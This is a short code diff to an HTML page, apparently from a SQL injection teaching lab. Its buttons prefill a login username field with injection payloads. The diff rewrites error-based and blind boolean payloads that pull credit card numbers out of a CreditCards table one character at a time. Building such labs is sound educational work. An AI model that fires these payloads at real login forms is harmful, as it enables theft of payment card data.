@@ -71,7 +71,7 @@
                 </p>
                 <div class="d-flex flex-wrap gap-2">
                     <button type="button" class="btn btn-sm btn-outline-danger payload-btn"
-                            data-username="' OR 1 = CONVERT(int, (SELECT TOP 1 CardNumber FROM CreditCards ORDER BY Id)) --"
+                            data-username="' OR 1 = CONVERT(int, (SELECT CardNumber FROM CreditCards WHERE Id = 1)) --"
                             data-password="x">
                         card number inside an error
                     </button>
@@ -82,12 +82,12 @@
                 </p>
                 <div class="d-flex flex-wrap gap-2">
                     <button type="button" class="btn btn-sm btn-outline-danger payload-btn"
-                            data-username="admin' AND SUBSTRING((SELECT TOP 1 CardNumber FROM CreditCards ORDER BY Id), 1, 1) = '4' --"
+                            data-username="admin' AND SUBSTRING((SELECT CardNumber FROM CreditCards WHERE Id = 1), 1, 1) = '4' --"
                             data-password="x">
                         does the card start with '4' ? (yes)
                     </button>
                     <button type="button" class="btn btn-sm btn-outline-danger payload-btn"
-                            data-username="admin' AND SUBSTRING((SELECT TOP 1 CardNumber FROM CreditCards ORDER BY Id), 1, 1) = '5' --"
+                            data-username="admin' AND SUBSTRING((SELECT CardNumber FROM CreditCards WHERE Id = 1), 1, 1) = '5' --"
                             data-password="x">
                         does it start with '5' ? (no)
                     </button>
